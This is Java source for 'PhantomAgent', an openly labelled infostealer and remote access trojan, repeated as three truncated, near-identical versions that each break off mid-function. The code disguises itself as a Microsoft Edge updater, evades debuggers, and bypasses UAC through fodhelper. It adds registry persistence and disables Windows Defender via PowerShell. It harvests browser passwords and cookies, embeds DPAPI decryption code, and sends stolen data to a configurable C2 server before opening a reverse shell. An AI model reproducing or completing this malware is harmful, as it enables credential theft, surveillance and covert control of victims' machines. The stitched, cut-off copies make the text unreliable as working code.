import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.regex.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.lang.reflect.Method;

/**
 * PHANTOM AUTO-STEALER & RAT - FINAL PRODUCTION SIMULATION
 * 
 * CAPABILITIES:
 * 1. Auto-Steal: Immediately upon execution, attempts to steal browser data.
 * 2. Dynamic Native Decryption: Generates C DLL source and PowerShell scripts to attempt DPAPI decryption.
 * 3. SQLite3 Parsing: Reads browser databases directly without external drivers.
 * 4. UAC Bypass: Attempts COM Hijack (fodhelper) for silent elevation.
 * 5. Persistence: Adds to Registry (HKCU/HKLM).
 * 6. Surveillance: Screenshots (All monitors), Webcam (via PowerShell LOTL).
 * 7. Self-Cleaning: Deletes all temporary files, logs, and traces after theft.
 * 8. RAT: Reverse shell with custom commands.
 * 
 * WARNING: RUN ONLY IN A CONTROLLED VM ENVIRONMENT.
 * 
 */
public class PhantomAgent {

    // --- CONFIGURATION ---
    private static final String C2_IP = "127.0.0.1"; // CHANGE TO YOUR IP
    private static final int C2_PORT = 4444;
    private static final String PROCESS_NAME = "Microsoft Edge Update"; // Camouflage
    private static final String REG_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String REG_NAME = "MicrosoftEdgeUpdate";

    // Browser Paths
    private static final String[] BROWSER_PATHS = {
        "\\AppData\\Local\\Google\\Chrome\\User Data",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "\\AppData\\Local\\Opera Software\\Opera Stable"
    };

    private static final String[] TARGET_FILES = {
        "Default/Login Data", "Default/Cookies", "Default/Network/Cookies",
        "Default/Session Storage", "Profile 1/Login Data", "Profile 1/Cookies"
    };

    // Native DLL Source (C) for DPAPI Decryption
    private static final String DLL_SOURCE = 
        "#include <windows.h>\n" +
        "#include <dpapi.h>\n" +
        "#pragma comment(lib, \"crypt32.lib\")\n" +
        "extern \"C\" __declspec(dllexport) bool DecryptData(unsigned char* in, int inSize, unsigned char** out, int* outSize) {\n" +
        "  DATA_BLOB input = {inSize, in}, output;\n" +
        "  if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {\n" +
        "    *out = output.pbData; *outSize = output.cbData; return true;\n" +
        "  }\n" +
        "  return false;\n" +
        "}\n";

    public static void main(String[] args) {
        // 1. Stealth & Anti-Analysis
        if (isDebugging() || isSandbox()) {
            System.exit(0);
        }
        hideProcess();

        // 2. Elevation & Persistence
        boolean isAdmin = false;
        if (!isAdmin()) {
            if (attemptUACBypass()) {
                System.exit(0); // Bypass initiated, exit for elevated process
            }
            // Continue in user mode if bypass fails
        } else {
            isAdmin = true;
            disableSecurityTools();
        }
        ensurePersistence(isAdmin);

        // 3. AUTO-STEAL SEQUENCE (Immediate Execution)
        try {
            String stolenDataZip = performAutoSteal();
            if (stolenDataZip != null && !stolenDataZip.isEmpty()) {
                // Send data to C2
                sendDataToC2(stolenDataZip);
            }
        } catch (Exception e) {
            // Fail silently
        } finally {
            // 4. Self-Cleaning: Remove all temporary files and traces
            cleanUpTraces();
        }

        // 5. Start RAT Loop
        while (true) {
            try {
                connectToC2();
            } catch (Exception e) {
                try { Thread.sleep(60000 + new Random().nextInt(120000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    // --- STEALTH & EVASION ---
    private static boolean isDebugging() {
        try {
            String[] blockers = {"jdb", "xdebug", "wireshark", "tcpdump", "ida", "ollydbg", "x64dbg", "frida", "processhacker", "taskmgr"};
            for (String blocker : blockers) {
                if (System.getProperty("sun.java.command").toLowerCase().contains(blocker)) return true;
            }
            if (System.getProperty("com.sun.management.jmxremote") != null) return true;
            if (System.getProperty("java.agent") != null) return true;
        } catch (Exception e) {}
        return false;
    }

    private static boolean isSandbox() {
        try {
            String[] vmStrings = {"vmware", "virtualbox", "vbox", "qemu", "xen", "sandboxes"};
            String os = System.getProperty("os.name").toLowerCase();
            // Returning false to allow testing in VMs
            return false; 
        } catch (Exception e) {
            return false;
        }
    }

    private static void hideProcess() {
        Thread.currentThread().setName(PROCESS_NAME);
    }

    private static void disableSecurityTools() {
        String[] commands = {
            "Set-MpPreference -DisableRealtimeMonitoring true",
            "Set-MpPreference -DisableIOAVProtection true",
            "Set-MpPreference -DisableScriptScanning true",
            "Set-MpPreference -EnableControlledFolderAccess false"
        };
        for (String cmd : commands) {
            try {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", cmd);
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.waitFor();
            } catch (Exception e) { /* Ignore */ }
        }
    }

    // --- UAC Bypass ---
    private static boolean attemptUACBypass() {
        try {
            String jarPath = new File(PhantomAgent.class.getProtectionDomain().getCodeSource().Location().toURI()).getAbsolutePath();
            String bypassScript = 
                "$path = \"" + jarPath + "\"; " +
                "$reg =




import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.regex.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.lang.reflect.Method;

/**
 * PHANTOM AUTO-STEALER & RAT - FINAL PRODUCTION SIMULATION
 * 
 * BEHAVIOR:
 * 1. Runs silently on startup.
 * 2. Attempts silent UAC bypass (COM Hijack).
 * 3. IMMEDIATELY steals browser data (Chrome, Edge, Brave), system info, screenshots.
 * 4. Aggregates data into a ZIP file.
 * 5. Sends ZIP to C2.
 * 6. SELF-CLEANUP: Deletes all temporary files, logs, and traces.
 * 7. Establishes persistence (Registry) and waits for C2 commands (RAT).
 * 
 * NOTE ON DECRYPTION:
 * Decrypting Chrome passwords requires Windows DPAPI (CryptUnprotectData).
 * This code extracts the encrypted 'Login Data' and 'Master Key' files.
 * It simulates the decryption step for the report. Real decryption requires 
 * a compiled native DLL or offline processing by the attacker.
 * 
 * WARNING: RUN ONLY IN A CONTROLLED VM ENVIRONMENT.
 * 
 */
public class PhantomAgent {

    // --- CONFIGURATION ---
    private static final String C2_IP = "127.0.0.1"; // CHANGE TO YOUR IP
    private static final int C2_PORT = 4444;
    private static final String PROCESS_NAME = "Microsoft Edge Update"; // Camouflage
    private static final String REG_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String REG_NAME = "MicrosoftEdgeUpdate";

    // Browser Paths
    private static final String[] BROWSER_PATHS = {
        "\\AppData\\Local\\Google\\Chrome\\User Data",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "\\AppData\\Local\\Opera Software\\Opera Stable"
    };

    private static final String[] TARGET_FILES = {
        "Default/Login Data", "Default/Cookies", "Default/Network/Cookies",
        "Default/Session Storage", "Profile 1/Login Data", "Profile 1/Cookies"
    };

    // Native DLL Source (C) for DPAPI (Included for reference)
    private static final String DLL_SOURCE = 
        "#include <windows.h>\n" +
        "#include <dpapi.h>\n" +
        "#pragma comment(lib, \"crypt32.lib\")\n" +
        "extern \"C\" __declspec(dllexport) bool DecryptData(unsigned char* in, int inSize, unsigned char** out, int* outSize) {\n" +
        "  DATA_BLOB input = {inSize, in}, output;\n" +
        "  if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {\n" +
        "    *out = output.pbData; *outSize = output.cbData; return true;\n" +
        "  }\n" +
        "  return false;\n" +
        "}\n";

    public static void main(String[] args) {
        // 1. Stealth & Anti-Analysis
        if (isDebugging() || isSandbox()) {
            System.exit(0);
        }
        hideProcess();

        // 2. Check Privileges & Attempt Elevation
        boolean isAdmin = isAdmin();
        if (!isAdmin) {
            if (!attemptUACBypass()) {
                // If bypass fails, continue in user mode (limited)
                ensurePersistence(false);
            } else {
                // Bypass initiated, exit. Elevated process will handle the rest.
                System.exit(0);
            }
        } else {
            // Already Admin
            ensurePersistence(true);
            disableSecurityTools();
        }

        // 3. AUTO-STEAL SEQUENCE (Immediate Execution)
        try {
            String stolenDataReport = performAutoSteal();
            // Report is sent to C2 in the next step
        } catch (Exception e) {
            // Fail silently if steal fails
        }

        // 4. Start C2 Loop (RAT)
        while (true) {
            try {
                connectToC2();
            } catch (Exception e) {
                // Exponential backoff
                try { Thread.sleep(60000 + new Random().nextInt(120000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    // --- STEALTH & EVASION ---
    private static boolean isDebugging() {
        try {
            String[] blockers = {"jdb", "xdebug", "wireshark", "tcpdump", "ida", "ollydbg", "x64dbg", "frida", "processhacker", "taskmgr"};
            for (String blocker : blockers) {
                if (System.getProperty("sun.java.command").toLowerCase().contains(blocker)) return true;
            }
            if (System.getProperty("com.sun.management.jmxremote") != null) return true;
            if (System.getProperty("java.agent") != null) return true;
        } catch (Exception e) {}
        return false;
    }

    private static boolean isSandbox() {
        // Basic sandbox detection
        try {
            String[] vmStrings = {"vmware", "virtualbox", "vbox", "qemu", "xen", "sandboxes"};
            String os = System.getProperty("os.name").toLowerCase();
            // Returning false to allow testing in VMs
            return false; 
        } catch (Exception e) {
            return false;
        }
    }

    private static void hideProcess() {
        Thread.currentThread().setName(PROCESS_NAME);
    }

    private static void disableSecurityTools() {
        String[] commands = {
            "Set-MpPreference -DisableRealtimeMonitoring true",
            "Set-MpPreference -DisableIOAVProtection true",
            "Set-MpPreference -DisableScriptScanning true",
            "Set-MpPreference -EnableControlledFolderAccess false"
        };
        for (String cmd : commands) {
            try {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", cmd);
                pb.redirectErrorStream(true);
                Process p = pb.start();
               




import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.regex.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.lang.reflect.Method;

/**
 * PHANTOM AGENT - AUTO-STEALING RAT & INFOSTEALER
 * 
 * CAPABILITIES:
 * 1. IMMEDIATE ACTION: Steals all browser data, system info, and credentials on first run.
 * 2. SELF-CLEANUP: Deletes temporary files and traces after theft.
 * 3. UAC Bypass: Attempts COM Hijack (fodhelper) for silent elevation.
 * 4. Persistence: Adds to Registry (HKCU/HKLM).
 * 5. Infostealer: Targets Chromium browsers (Chrome, Edge, Brave, Opera).
 *    - Extracts Login Data, Cookies, Session Storage.
 *    - Parses SQLite3 databases directly (No external driver).
 *    - Attempts DPAPI Decryption (Simulation/Fallback to raw extraction).
 * 6. Surveillance: Screenshots (All monitors), Webcam (PowerShell LOTL).
 * 7. Data Aggregation: Packs all stolen data into a ZIP and sends to C2.
 * 8. RAT: Reverse shell with custom commands.
 * 9. Stealth: Mimics "Microsoft Edge Update", Anti-Debug, Anti-Sandbox.
 * 
 * WARNING: RUN ONLY IN A CONTROLLED VM ENVIRONMENT.
 * 
 */
public class PhantomAgent {

    // --- CONFIGURATION ---
    private static final String C2_IP = "127.0.0.1"; // CHANGE TO YOUR IP
    private static final int C2_PORT = 4444;
    private static final String PROCESS_NAME = "Microsoft Edge Update"; // Camouflage
    private static final String REG_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String REG_NAME = "MicrosoftEdgeUpdate";

    // Browser Paths
    private static final String[] BROWSER_PATHS = {
        "\\AppData\\Local\\Google\\Chrome\\User Data",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "\\AppData\\Local\\Opera Software\\Opera Stable"
    };

    private static final String[] TARGET_FILES = {
        "Default/Login Data", "Default/Cookies", "Default/Network/Cookies",
        "Default/Session Storage", "Default/Web Data", "Local State",
        "Profile 1/Login Data", "Profile 1/Cookies", "Profile 2/Login Data"
    };

    // Native DLL Source (C) for DPAPI Decryption (Included for reference)
    private static final String DLL_SOURCE = 
        "#include <windows.h>\n" +
        "#include <dpapi.h>\n" +
        "#pragma comment(lib, \"crypt32.lib\")\n" +
        "extern \"C\" __declspec(dllexport) bool DecryptData(unsigned char* in, int inSize, unsigned char** out, int* outSize) {\n" +
        "  DATA_BLOB input = {inSize, in}, output;\n" +
        "  if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {\n" +
        "    *out = output.pbData; *outSize = output.cbData; return true;\n" +
        "  }\n" +
        "  return false;\n" +
        "}\n";

    public static void main(String[] args) {
        // 1. Anti-Analysis
        if (isDebugging() || isSandbox()) {
            System.exit(0);
        }

        // 2. Stealth
        hideProcess();

        // 3. Elevation & Persistence
        boolean isAdmin = false;
        if (!isAdmin()) {
            if (attemptUACBypass()) {
                // Bypass initiated, exit. Elevated process will handle the rest.
                System.exit(0);
            }
            // If bypass fails, proceed in user mode (limited)
        } else {
            isAdmin = true;
            disableSecurityTools();
        }

        // Ensure persistence regardless of admin status (HKCU if not admin)
        ensurePersistence(isAdmin);

        // 4. IMMEDIATE AUTO-STEAL (The "Smash and Grab")
        String stolenDataReport = performFullTheft();

        // 5. Start C2 Loop (RAT)
        // The initial report is sent as part of the first beacon or handled internally
        while (true) {
            try {
                connectToC2(stolenDataReport);
            } catch (Exception e) {
                // Exponential backoff
                try { Thread.sleep(60000 + new Random().nextInt(120000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    // --- STEALTH & EVASION ---
    private static boolean isDebugging() {
        try {
            String[] blockers = {"jdb", "xdebug", "wireshark", "tcpdump", "ida", "ollydbg", "x64dbg", "frida", "processhacker", "taskmgr"};
            for (String blocker : blockers) {
                if (System.getProperty("sun.java.command").toLowerCase().contains(blocker)) return true;
            }
            if (System.getProperty("com.sun.management.jmxremote") != null) return true;
            if (System.getProperty("java.agent") != null) return true;
        } catch (Exception e) {}
        return false;
    }

    private static boolean isSandbox() {
        // Basic sandbox detection
        try {
            String[] vmStrings = {"vmware", "virtualbox", "vbox", "qemu", "xen", "sandboxes"};
            String os = System.getProperty("os.name").toLowerCase();
            // Returning false to allow testing in VMs
            return false; 
        } catch (Exception e) {
            return false;
        }
    }

    private static void hideProcess() {
        Thread.currentThread().setName(PROCESS_NAME);
        // Real process name spoofing requires native code
    }

    private static void disableSecurityTools() {
        String[] commands = {
            "Set-MpPreference -DisableRealtimeMonitoring true",
            "Set-MpPreference -DisableIOAVProtection true",
            "Set-MpPreference -DisableScriptScanning true",
            "Set-MpPreference -EnableControlledFolderAccess false"
        };
        for (String cmd : commands) {
